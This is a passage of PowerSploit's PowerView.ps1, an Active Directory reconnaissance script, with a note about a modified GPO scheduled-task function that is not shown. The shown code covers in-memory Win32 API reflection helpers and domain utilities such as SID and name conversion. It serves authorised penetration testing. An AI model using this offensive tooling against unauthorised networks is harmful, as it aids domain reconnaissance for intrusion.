#requires -version 2

########################################################
#
# source：https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1
# I made a little change of $TaskXML in function New-GPOImmediateTask.
# The logon type is changed from "Run whether user is logged on or not"(S4U) to "Run only when user is logged on"(InteractiveToken).
# 
########################################################

<#
    PowerSploit File: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
    .SYNOPSIS
        Creates an in-memory assembly and module
        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    .DESCRIPTION
        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.
    .PARAMETER ModuleName
        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.
    .EXAMPLE
        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
    .SYNOPSIS
        Creates a .NET type for an unmanaged Win32 function.
        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func
    .DESCRIPTION
        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).
        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.
    .PARAMETER DllName
        The name of the DLL.
    .PARAMETER FunctionName
        The name of the target function.
    .PARAMETER ReturnType
        The return type of the function.
    .PARAMETER ParameterTypes
        The function parameters.
    .PARAMETER NativeCallingConvention
        Specifies the native calling convention of the function. Defaults to
        stdcall.
    .PARAMETER Charset
        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.
    .PARAMETER SetLastError
        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.
    .PARAMETER Module
        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.
    .PARAMETER Namespace
        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.
    .EXAMPLE
        $Mod = New-InMemoryModule -ModuleName Win32
        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )
        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
    .NOTES
        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
    .SYNOPSIS
        Creates an in-memory enumeration for use in your PowerShell session.
        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION
        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.
    .PARAMETER Module
        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.
    .PARAMETER FullName
        The fully-qualified name of the enum.
    .PARAMETER Type
        The type of each enum element.
    .PARAMETER EnumElements
        A hashtable of enum elements.
    .PARAMETER Bitfield
        Specifies that the enum should be treated as a bitfield.
    .EXAMPLE
        $Mod = New-InMemoryModule -ModuleName Win32
        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }
    .NOTES
        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
    .SYNOPSIS
        Creates an in-memory struct for use in your PowerShell session.
        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: field
    .DESCRIPTION
        The 'struct' function facilitates the creation of structs entirely in
        memory using as close to a "C style" as PowerShell will allow. Struct
        fields are specified using a hashtable where each field of the struct
        is comprosed of the order in which it should be defined, its .NET
        type, and optionally, its offset and special marshaling attributes.
        One of the features of 'struct' is that after your struct is defined,
        it will come with a built-in GetSize method as well as an explicit
        converter so that you can easily cast an IntPtr to the struct without
        relying upon calling SizeOf and/or PtrToStructure in the Marshal
        class.
    .PARAMETER Module
        The in-memory module that will host the struct. Use
        New-InMemoryModule to define an in-memory module.
    .PARAMETER FullName
        The fully-qualified name of the struct.
    .PARAMETER StructFields
        A hashtable of fields. Use the 'field' helper function to ease
        defining each field.
    .PARAMETER PackingSize
        Specifies the memory alignment of fields.
    .PARAMETER ExplicitLayout
        Indicates that an explicit offset for each field will be specified.
    .EXAMPLE
        $Mod = New-InMemoryModule -ModuleName Win32
        $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
            DOS_SIGNATURE =    0x5A4D
            OS2_SIGNATURE =    0x454E
            OS2_SIGNATURE_LE = 0x454C
            VXD_SIGNATURE =    0x454C
        }
        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
            e_magic =    field 0 $ImageDosSignature
            e_cblp =     field 1 UInt16
            e_cp =       field 2 UInt16
            e_crlc =     field 3 UInt16
            e_cparhdr =  field 4 UInt16
            e_minalloc = field 5 UInt16
            e_maxalloc = field 6 UInt16
            e_ss =       field 7 UInt16
            e_sp =       field 8 UInt16
            e_csum =     field 9 UInt16
            e_ip =       field 10 UInt16
            e_cs =       field 11 UInt16
            e_lfarlc =   field 12 UInt16
            e_ovno =     field 13 UInt16
            e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
            e_oemid =    field 15 UInt16
            e_oeminfo =  field 16 UInt16
            e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
            e_lfanew =   field 18 Int32
        }
        # Example of using an explicit layout in order to create a union.
        $TestUnion = struct $Mod TestUnion @{
            field1 = field 0 UInt32 0
            field2 = field 1 IntPtr 0
        } -ExplicitLayout
    .NOTES
        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

filter Export-PowerViewCSV {
<#
    .SYNOPSIS
        This helper exports an -InputObject to a .csv in a thread-safe manner
        using a mutex. This is so the various multi-threaded functions in
        PowerView has a thread-safe way to export output to the same file.
        
        Based partially on Dmitry Sotnikov's Export-CSV code
            at http://poshcode.org/1590
    .LINK
        http://poshcode.org/1590
        http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [String]
        [ValidateNotNullOrEmpty()]
        $OutFile
    )

    $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation

    # mutex so threaded code doesn't stomp on the output file
    $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
    $Null = $Mutex.WaitOne()

    if (Test-Path -Path $OutFile) {
        # hack to skip the first line of output if the file already exists
        $ObjectCSV | ForEach-Object { $Start=$True }{ if ($Start) {$Start=$False} else {$_} } | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
    }
    else {
        $ObjectCSV | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
    }

    $Mutex.ReleaseMutex()
}


filter Get-IPAddress {
<#
    .SYNOPSIS
        Resolves a given hostename to its associated IPv4 address. 
        If no hostname is provided, it defaults to returning
        the IP address of the localhost.
    .EXAMPLE
        PS C:\> Get-IPAddress -ComputerName SERVER
        
        Return the IPv4 address of 'SERVER'
    .EXAMPLE
        PS C:\> Get-Content .\hostnames.txt | Get-IPAddress
        Get the IP addresses of all hostnames in an input file.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = $Env:ComputerName
    )

    try {
        # extract the computer name from whatever object was passed on the pipeline
        $Computer = $ComputerName | Get-NameField

        # get the IP resolution of this specified hostname
        @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
            if ($_.AddressFamily -eq 'InterNetwork') {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ComputerName' $Computer
                $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                $Out
            }
        }
    }
    catch {
        Write-Verbose -Message 'Could not resolve host to an IP Address.'
    }
}


filter Convert-NameToSid {
<#
    .SYNOPSIS
        Converts a given user/group name to a security identifier (SID).
    .PARAMETER ObjectName
        The user/group name to convert, can be 'user' or 'DOMAIN\user' format.
    .PARAMETER Domain
        Specific domain for the given user account, defaults to the current domain.
    .EXAMPLE
        PS C:\> Convert-NameToSid 'DEV\dfm'
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,

        [String]
        $Domain
    )

    $ObjectName = $ObjectName -Replace "/","\"
    
    if($ObjectName.Contains("\")) {
        # if we get a DOMAIN\user format, auto convert it
        $Domain = $ObjectName.Split("\")[0]
        $ObjectName = $ObjectName.Split("\")[1]
    }
    elseif(!$Domain) {
        $Domain = (Get-NetDomain).Name
    }

    try {
        $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $ObjectName))
        $SID = $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ObjectName' $ObjectName
        $Out | Add-Member Noteproperty 'SID' $SID
        $Out
    }
    catch {
        Write-Verbose "Invalid object/name: $Domain\$ObjectName"
        $Null
    }
}


filter Convert-SidToName {
<#
    .SYNOPSIS
    
        Converts a security identifier (SID) to a group/user name.
    .PARAMETER SID
    
        The SID to convert.
    .EXAMPLE
        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [ValidatePattern('^S-1-.*')]
        $SID
    )

    try {
        $SID2 = $SID.trim('*')

        # try to resolve any built-in SIDs first
        #   from https://support.microsoft.com/en-us/kb/243330
        Switch ($SID2)
        {
            'S-1-0'         { 'Null Authority' }
            'S-1-0-0'       { 'Nobody' }
            'S-1-1'         { 'World Authority' }
            'S-1-1-0'       { 'Everyone' }
            'S-1-2'         { 'Local Authority' }
            'S-1-2-0'       { 'Local' }
            'S-1-2-1'       { 'Console Logon ' }
            'S-1-3'         { 'Creator Authority' }
            'S-1-3-0'       { 'Creator Owner' }
            'S-1-3-1'       { 'Creator Group' }
            'S-1-3-2'       { 'Creator Owner Server' }
            'S-1-3-3'       { 'Creator Group Server' }
            'S-1-3-4'       { 'Owner Rights' }
            'S-1-4'         { 'Non-unique Authority' }
            'S-1-5'         { 'NT Authority' }
            'S-1-5-1'       { 'Dialup' }
            'S-1-5-2'       { 'Network' }
            'S-1-5-3'       { 'Batch' }
            'S-1-5-4'       { 'Interactive' }
            'S-1-5-6'       { 'Service' }
            'S-1-5-7'       { 'Anonymous' }
            'S-1-5-8'       { 'Proxy' }
            'S-1-5-9'       { 'Enterprise Domain Controllers' }
            'S-1-5-10'      { 'Principal Self' }
            'S-1-5-11'      { 'Authenticated Users' }
            'S-1-5-12'      { 'Restricted Code' }
            'S-1-5-13'      { 'Terminal Server Users' }
            'S-1-5-14'      { 'Remote Interactive Logon' }
            'S-1-5-15'      { 'This Organization ' }
            'S-1-5-17'      { 'This Organization ' }
            'S-1-5-18'      { 'Local System' }
            'S-1-5-19'      { 'NT Authority' }
            'S-1-5-20'      { 'NT Authority' }
            'S-1-5-80-0'    { 'All Services ' }
            'S-1-5-32-544'  { 'BUILTIN\Administrators' }
            'S-1-5-32-545'  { 'BUILTIN\Users' }
            'S-1-5-32-546'  { 'BUILTIN\Guests' }
            'S-1-5-32-547'  { 'BUILTIN\Power Users' }
            'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
            'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
            'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
            'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
            'S-1-5-32-552'  { 'BUILTIN\Replicators' }
            'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
            'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
            'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
            'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
            'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
            'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
            'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
            'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
            'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
            'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
            'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
            'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
            'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
            'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
            'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
            'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
            'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
            'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
            Default { 
                $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                $Obj.Translate( [System.Security.Principal.NTAccount]).Value
            }
        }
    }
    catch {
        Write-Debug "Invalid SID: $SID"
        $SID
    }
}


filter Convert-ADName {
<#
    .SYNOPSIS
        Converts user/group names from NT4 (DOMAIN\user) or domainSimple (user@domain.com)
        to canonical format (domain.com/Users/user) or NT4.
        Based on Bill Stewart's code from this article: 
            http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
    .PARAMETER ObjectName
        The user/group name to convert.
    .PARAMETER InputType
        The InputType of the user/group name ("NT4","Simple","Canonical").
    .PARAMETER OutputType
        The OutputType of the user/group name ("NT4","Simple","Canonical").
    .EXAMPLE
        PS C:\> Convert-ADName -ObjectName "dev\dfm"
        
        Returns "dev.testlab.local/Users/Dave"
    .EXAMPLE
        PS C:\> Convert-SidToName "S-..." | Convert-ADName
        
        Returns the canonical name for the resolved SID.
    .LINK
        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $ObjectName,

        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $InputType,

        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $OutputType
    )

    $NameTypes = @{
        "Canonical" = 2
        "NT4"       = 3
        "Simple"    = 5
    }

    if(!$PSBoundParameters['InputType']) {
        if( ($ObjectName.split('/')).Count -eq 2 ) {
            $ObjectName = $ObjectName.replace('/', '\')
        }

        if($ObjectName -match "^[A-Za-z]+\\[A-Za-z ]+$") {
            $InputType = 'NT4'
        }
        elseif($ObjectName -match "^[A-Za-z ]+@[A-Za-z\.]+") {
            $InputType = 'Simple'
        }
        elseif($ObjectName -match "^[A-Za-z\.]+/[A-Za-z]+/[A-Za-z/ ]+") {
            $InputType = 'Canonical'
        }
        else {
            Write-Warning "Can not identify InType for $ObjectName"
            return $ObjectName
        }
    }
    elseif($InputType -eq 'NT4') {
        $ObjectName = $ObjectName.replace('/', '\')
    }

    if(!$PSBoundParameters['OutputType']) {
        $OutputType = Switch($InputType) {
            'NT4' {'Canonical'}
            'Simple' {'NT4'}
            'Canonical' {'NT4'}
        }
    }

    # try to extract the domain from the given format
    $Domain = Switch($InputType) {
        'NT4' { $ObjectName.split("\")[0] }
        'Simple' { $ObjectName.split("@")[1] }
        'Canonical' { $ObjectName.split("/")[0] }
    }

    # Accessor functions to simplify calls to NameTranslate
    function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
        $Output = $Object.GetType().InvokeMember($Method, "InvokeMethod", $Null, $Object, $Parameters)
        if ( $Output ) { $Output }
    }
    function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
        [Void] $Object.GetType().InvokeMember($Property, "SetProperty", $Null, $Object, $Parameters)
    }

    $Translate = New-Object -ComObject NameTranslate

    try {
        Invoke-Method $Translate "Init" (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { 
        Write-Debug "Error with translate init in Convert-ADName: $_"
    }

    Set-Property $Translate "ChaseReferral" (0x60)

    try {
        Invoke-Method $Translate "Set" ($NameTypes[$InputType], $ObjectName)
        (Invoke-Method $Translate "Get" ($NameTypes[$OutputType]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Debug "Error with translate Set/Get in Convert-ADName: $_"
    }
}


function ConvertFrom-UACValue {
<#
    .SYNOPSIS
        Converts a UAC int value to human readable form.
    .PARAMETER Value
        The int UAC value to convert.
    .PARAMETER ShowAll
        Show all UAC values, with a + indicating the value is currently set.
    .EXAMPLE
        PS C:\> ConvertFrom-UACValue -Value 66176
        Convert the UAC value 66176 to human readable format.
    .EXAMPLE
        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue
        Convert the UAC value for 'jason' to human readable format.
    .EXAMPLE
        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll
        Convert the UAC value for 'jason' to human readable format, showing all
        possible UAC values.
#>
    
    [CmdletBinding()]
